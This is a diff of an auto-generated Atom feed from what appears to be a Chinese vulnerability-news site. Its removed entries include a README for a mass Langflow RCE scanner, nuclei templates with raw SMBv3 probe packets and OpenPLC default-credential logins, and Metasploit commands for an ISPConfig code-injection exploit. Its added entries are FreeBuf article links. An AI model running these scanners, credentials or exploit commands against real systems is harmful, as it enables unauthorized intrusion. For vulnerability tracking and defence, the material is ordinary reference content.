@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-25T04:00:27.151Z</updated>
+  <updated>2025-06-25T05:22:42.013Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,532 +17,542 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>Langflow 代码注入漏洞</title>
-    <link href="http://example.com/2025/06/25/github_224888099/"/>
-    <id>http://example.com/2025/06/25/github_224888099/</id>
-    <published>2025-06-25T04:00:27.152Z</published>
-    <updated>2025-06-25T04:00:27.151Z</updated>
+    <title>Prometei僵尸网络攻击Linux服务器进行加密货币挖矿</title>
+    <link href="http://example.com/2025/06/25/weixin_4140484136/"/>
+    <id>http://example.com/2025/06/25/weixin_4140484136/</id>
+    <published>2025-06-25T05:22:42.018Z</published>
+    <updated>2025-06-25T05:22:42.013Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Langflow 代码注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-3248</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Langflow 1.3.0之前的版本中，&#x2F;api&#x2F;v1&#x2F;validate&#x2F;code端点存在代码注入漏洞。远程且未经认证的攻击者可以发送特制的HTTP请求来执行任意代码。</p><p><strong>产品厂商：</strong> Langflow</p><p><strong>产品名称：</strong> Langflow</p><p><strong>影响版本：</strong> version &lt; 1.3.0</p><p><strong>来源：</strong> <a href="https://github.com/ill-deed/Langflow-CVE-2025-3248-Multi-target">https://github.com/ill-deed/Langflow-CVE-2025-3248-Multi-target</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>scanner.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="⚠️-Langflow-RCE-Exploit-Scanner-CVE-2025-3248"><a href="#⚠️-Langflow-RCE-Exploit-Scanner-CVE-2025-3248" class="headerlink" title="⚠️ Langflow RCE Exploit Scanner (CVE-2025-3248)"></a>⚠️ Langflow RCE Exploit Scanner (CVE-2025-3248)</h2><p>This Python-based scanner automates the detection of <strong>unauthenticated Remote Code Execution (RCE)</strong> vulnerabilities in Langflow instances via <strong>CVE-2025-3248</strong>. It uses a proof-of-concept payload that abuses the <code>/api/v1/validate/code</code> endpoint to execute arbitrary shell commands.</p><h3 id="🚨-CVE-Details"><a href="#🚨-CVE-Details" class="headerlink" title="🚨 CVE Details"></a>🚨 CVE Details</h3><ul><li><strong>CVE</strong>: CVE-2025-3248</li><li><strong>Impact</strong>: Unauthenticated Remote Code Execution</li><li><strong>Component</strong>: Langflow API (<code>/api/v1/validate/code</code>)</li><li><strong>Exploit</strong>: Injection via dynamic code evaluation</li><li><strong>Risk</strong>: Critical</li></ul><h3 id="🛠-Features"><a href="#🛠-Features" class="headerlink" title="🛠 Features"></a>🛠 Features</h3><ul><li>🔎 Batch scan multiple targets from a file</li><li>⚡️ Multi-threaded for fast performance</li><li>✅ Validates RCE by checking for expected command output (e.g., <code>uid=</code>)</li><li>📁 Outputs vulnerable targets to <code>vuln.txt</code></li><li>🧱 Clean, modular code structure</li></ul><h3 id="📦-Requirements"><a href="#📦-Requirements" class="headerlink" title="📦 Requirements"></a>📦 Requirements</h3><ul><li>Python 3.x</li><li><code>requests</code> library</li></ul><p>Install dependencies:</p><p>pip install requests</p><h3 id="📂-Usage"><a href="#📂-Usage" class="headerlink" title="📂 Usage"></a>📂 Usage</h3><ol><li>Add targets (with or without http(s):&#x2F;&#x2F;) to targets.txt, one per line:</li></ol><p><a href="http://example.com/">http://example.com</a><br>192.168.1.100:7860<br><a href="https://target.net/">https://target.net</a></p><ol start="2"><li>Run the script:</li></ol><p>python3 langflow_rce_structured.py</p><ol start="3"><li>Check vuln.txt for successful exploitation results:</li></ol><p><a href="http://vulnerable-target.com/">http://vulnerable-target.com</a> | uid&#x3D;1000(user) gid&#x3D;1000(user) groups&#x3D;1000(user)</p><h3 id="⚙️-Configuration"><a href="#⚙️-Configuration" class="headerlink" title="⚙️ Configuration"></a>⚙️ Configuration</h3><p>Modify the following values at the top of the script as needed:</p><p>COMMAND: Shell command to execute (default: id)</p><p>EXPECTED_SUBSTRING: Substring to confirm execution (default: uid&#x3D;)</p><p>THREADS: Number of concurrent threads (default: 20)</p><h3 id="🔒-Disclaimer"><a href="#🔒-Disclaimer" class="headerlink" title="🔒 Disclaimer"></a>🔒 Disclaimer</h3><p>This tool is provided for educational and authorized security testing only. Unauthorized access to systems is illegal and unethical. You are solely responsible for your use of this code.</p><h3 id="🙏-Credits"><a href="#🙏-Credits" class="headerlink" title="🙏 Credits"></a>🙏 Credits</h3><p>Exploit Author: ynsmroztas</p><p>Script Refactor: ill deed</p><h3 id="📄-License"><a href="#📄-License" class="headerlink" title="📄 License"></a>📄 License</h3><p>MIT License – use responsibly.</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/PbLMGfnaabKwsDrhGloREQ">https://mp.weixin.qq.com/s/PbLMGfnaabKwsDrhGloREQ</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Langflow 代码注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/s</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/PbLMGfnaabKwsDrhGloREQ&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>Microsoft SMBv3 远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/25/github_3619572951/"/>
-    <id>http://example.com/2025/06/25/github_3619572951/</id>
-    <published>2025-06-25T04:00:18.703Z</published>
-    <updated>2025-06-25T04:00:18.703Z</updated>
+    <title>一周网安优质PDF资源推荐  FreeBuf知识大陆</title>
+    <link href="http://example.com/2025/06/25/weixin_2781266630/"/>
+    <id>http://example.com/2025/06/25/weixin_2781266630/</id>
+    <published>2025-06-25T05:22:41.694Z</published>
+    <updated>2025-06-25T05:22:41.689Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Microsoft SMBv3 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-0796</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Microsoft Server Message Block 3.1.1 (SMBv3)协议处理某些请求时存在远程代码执行漏洞，攻击者可利用此漏洞在目标系统上执行任意代码。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> Windows 10 1903</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:microsoft:windows_10_1903”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/40408091ca076bb197a88c3ac2c8852d4182f2be/network%2Fcves%2F2020%2FCVE-2020-0796.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/40408091ca076bb197a88c3ac2c8852d4182f2be/network%2Fcves%2F2020%2FCVE-2020-0796.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">0796</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Microsoft SMBv3 <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> Yusuf Amr<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    A remote code execution vulnerability exists <span class="hljs-keyword">in</span> the way that the Microsoft Server Message Block <span class="hljs-number">3.1</span>.<span class="hljs-number">1</span> (SMBv3) protocol handles certain requests, aka &#x27;Windows SMBv3 Client<span class="hljs-symbol">/Server</span> Remote Code Execution Vulnerability&#x27;.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>cve.mitre.org<span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>cvename.cgi<span class="hljs-operator">?</span>name<span class="hljs-operator">=</span>CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">0796</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/tdevworks/CVE-2020-0796-SMBGhost-Exploit-Demo</span><br>    <span class="hljs-operator">-</span> http:<span class="hljs-symbol">//packetstormsecurity.com/files/156731/CoronaBlue-SMBGhost-Microsoft-Windows-10-SMB-3.1.1-Proof-Of-Concept.html</span><br>    <span class="hljs-operator">-</span> http:<span class="hljs-symbol">//packetstormsecurity.com/files/156980/Microsoft-Windows-10-SMB-3.1.1-Local-Privilege-Escalation.html</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">10</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">0796</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">119</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.94419</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99976</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:o:microsoft:windows_10_1903:-:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:arm64:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> microsoft<br>    <span class="hljs-params">product:</span> windows_10_1903<br>    <span class="hljs-params">shodan-query:</span> cpe:<span class="hljs-string">&quot;cpe:2.3:o:microsoft:windows_10_1903&quot;</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">tags:</span> cve,cve2020,microsoft,smb,kev<br><br><span class="hljs-params">tcp:</span><br>  <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">445</span><br><br>    <span class="hljs-params">inputs:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(<span class="hljs-char escape_">\&quot;</span>000000c2fe534d4240000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000024000800000000007f0000000102abcd0102abcd0102abcd0102abcd7800000002000000020210022202240200030203100311030000000001002600000000000100200001000000000000000000000000000000000000000000000000000000000000000000000003000a0000000000010000000100000001000000000000000000<span class="hljs-char escape_">\&quot;</span>)&#125;&#125;&quot;</span><br><br>        <span class="hljs-params">read:</span> <span class="hljs-number">8192</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(<span class="hljs-char escape_">\&quot;</span>000000a0fc534d42ffffffff0100000080000000fe534d424000000000000000010000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000001900000200000000000000005800280000000000000000004e544c4d5353500001000000329088e2000000002800000000000000280000000601b11d0000000f00000000000000000000000000000000<span class="hljs-char escape_">\&quot;</span>)&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> binary<br>        <span class="hljs-params">part:</span> data<br>        <span class="hljs-params">encoding:</span> hex<br>        <span class="hljs-params">binary:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;fc534d4248000000&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;0d0000c0&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;1000602d00&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> binary<br>        <span class="hljs-params">part:</span> data<br>        <span class="hljs-params">encoding:</span> hex<br>        <span class="hljs-params">binary:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;00000031fc534d424800000001000000000000001eb000fe534d4240000000c00d0000c00100011000602d00100103301e28090442&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/-ldjDRwgYP1plj5CAV10Aw">https://mp.weixin.qq.com/s/-ldjDRwgYP1plj5CAV10Aw</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Microsoft SMBv3 远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/-ldjDRwgYP1plj5CAV10Aw&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>ISPConfig PHP代码注入漏洞</title>
-    <link href="http://example.com/2025/06/25/github_858268532/"/>
-    <id>http://example.com/2025/06/25/github_858268532/</id>
-    <published>2025-06-25T02:45:56.203Z</published>
-    <updated>2025-06-25T02:45:56.198Z</updated>
+    <title>以色列-伊朗网络战攻防，“第二战场”持续加速升级</title>
+    <link href="http://example.com/2025/06/25/weixin_2727420805/"/>
+    <id>http://example.com/2025/06/25/weixin_2727420805/</id>
+    <published>2025-06-25T05:22:41.378Z</published>
+    <updated>2025-06-25T05:22:41.373Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig PHP代码注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 在ISPConfig 3.2.11p1之前的版本中发现了一个问题。如果启用了admin_allow_langedit，管理员可以通过语言文件编辑器实现PHP代码注入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/SyFi/CVE-2023-46818">https://github.com/SyFi/CVE-2023-46818</a></p><p><strong>类型：</strong> CVE-2023:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>ispconfig_language_edit.rb</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Metasploit-module"><a href="#Metasploit-module" class="headerlink" title="Metasploit-module"></a>Metasploit-module</h2><p>Metasploit Module</p><p><img src="https://github.com/user-attachments/assets/9c78e7e6-c326-4379-ba12-820cffd9528b" alt="image"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/linux/http/ispconfig_language_edit<br><span class="hljs-built_in">set</span> RHOSTS target.com<br><span class="hljs-built_in">set</span> USERNAME admin<br><span class="hljs-built_in">set</span> PASSWORD password123<br><span class="hljs-built_in">set</span> LHOST 127.0.0.1<br><span class="hljs-built_in">set</span> LPORT 4444<br>exploit<br></code></pre></td></tr></table></figure><p>An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin_allow_langedit is enabled.</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/iq9ZeW4iX2RZAyJPKB101A">https://mp.weixin.qq.com/s/iq9ZeW4iX2RZAyJPKB101A</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig PHP代码注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/iq9ZeW4iX2RZAyJPKB101A&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>OpenPLC Webserver v3 默认登录漏洞</title>
-    <link href="http://example.com/2025/06/25/github_1954972878/"/>
-    <id>http://example.com/2025/06/25/github_1954972878/</id>
-    <published>2025-06-25T02:45:45.877Z</published>
-    <updated>2025-06-25T02:45:45.874Z</updated>
+    <title>逾10万个WordPress网站因MCP漏洞面临权限提升攻击风险</title>
+    <link href="http://example.com/2025/06/25/weixin_1127724704/"/>
+    <id>http://example.com/2025/06/25/weixin_1127724704/</id>
+    <published>2025-06-25T05:22:41.040Z</published>
+    <updated>2025-06-25T05:22:41.037Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> OpenPLC Webserver v3 默认登录漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> OpenPLC Webserver v3存在默认凭证（openplc:openplc），允许未经授权访问web界面。</p><p><strong>产品厂商：</strong> OpenPLC</p><p><strong>产品名称：</strong> OpenPLC Webserver</p><p><strong>影响版本：</strong> v3</p><p><strong>搜索语法：</strong> html:”alt&#x3D;”OpenPLC””</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/08c5ba235beecf30199d277cc62a69f814d67655/http%2Fdefault-logins%2Fopenplc%2Fopenplc-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/08c5ba235beecf30199d277cc62a69f814d67655/http%2Fdefault-logins%2Fopenplc%2Fopenplc-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> openplc-default-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> OpenPLC Webserver v3 <span class="hljs-operator">-</span> Default Login<br>  <span class="hljs-params">author:</span> machevalia<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    Identifies default credentials (openplc:openplc) on OpenPLC Webserver v3, allowing unauthorized access to the web interface.<br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">shodan-query:</span> html:<span class="hljs-string">&quot;alt=&quot;</span>OpenPLC<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>  <span class="hljs-params">tags:</span> openplc,default-login,iot<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">username:</span> <span class="hljs-string">&quot;openplc&quot;</span><br>  <span class="hljs-params">password:</span> <span class="hljs-string">&quot;openplc&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">username</span><span class="hljs-operator">=</span>&#123;&#123;username&#125;&#125;&amp;password<span class="hljs-operator">=</span>&#123;&#123;password&#125;&#125;<br><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/dashboard</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Dashboard&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Runtime Logs&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/fG17Qm2O1zAbvVoqOkG2wQ">https://mp.weixin.qq.com/s/fG17Qm2O1zAbvVoqOkG2wQ</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; OpenPLC Webserver v3 默认登录漏洞&lt;/p&gt;
-&lt;p&gt;&lt;str</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/fG17Qm2O1zAbvVoqOkG2wQ&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>ISPConfig language_editphp PHP代码注入漏洞</title>
-    <link href="http://example.com/2025/06/25/github_2860129429/"/>
-    <id>http://example.com/2025/06/25/github_2860129429/</id>
-    <published>2025-06-25T02:45:35.918Z</published>
-    <updated>2025-06-25T02:45:35.914Z</updated>
+    <title>手游挖洞深度实战 × AI安全赋能，月神SRC课程第四期重磅来袭！</title>
+    <link href="http://example.com/2025/06/25/weixin_2698400310/"/>
+    <id>http://example.com/2025/06/25/weixin_2698400310/</id>
+    <published>2025-06-25T05:22:40.691Z</published>
+    <updated>2025-06-25T05:22:40.685Z</updated>
     
